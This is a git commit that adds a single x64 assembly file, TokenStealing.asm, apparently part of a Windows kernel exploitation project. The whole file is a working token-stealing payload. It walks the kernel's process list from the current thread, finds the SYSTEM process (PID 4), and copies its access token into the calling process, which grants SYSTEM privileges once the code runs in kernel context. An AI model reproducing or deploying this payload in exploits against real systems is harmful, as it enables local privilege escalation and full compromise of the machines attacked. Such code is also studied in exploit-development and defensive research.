0e049552e967d87fa8cd042be4e3f1a6e7f8aafe
MortenSchenk <morten@schenkfamilien.dk>
2017-02-27 13:22:49 +0100

    Add files via upload

---
+++ TokenStealing.asm
@@ -0,0 +1,28 @@
+.code
+
+TokenStealingPayload PROC
+	mov r9, qword ptr gs:[188h]
+	mov r9, qword ptr [r9 + 220h]
+	mov r8, qword ptr [r9 + 3e0h]
+	mov rax, r9
+	loop1:
+	mov rax, qword ptr [rax + 2f0h]
+	sub rax, 2f0h
+	cmp qword ptr [rax + 2e8h], r8
+	jne loop1
+	mov rcx, rax
+	add rcx, 358h
+	mov rax, r9
+	loop2:
+	mov rax, qword ptr [rax + 2f0h]
+	sub rax, 2f0h
+	cmp qword ptr [rax + 2e8h], 4
+	jne loop2
+	mov rdx, rax
+	add rdx, 358h
+	mov rdx, qword ptr [rdx]
+	mov qword ptr [rcx], rdx 
+	ret
+TokenStealingPayload ENDP
+
+END
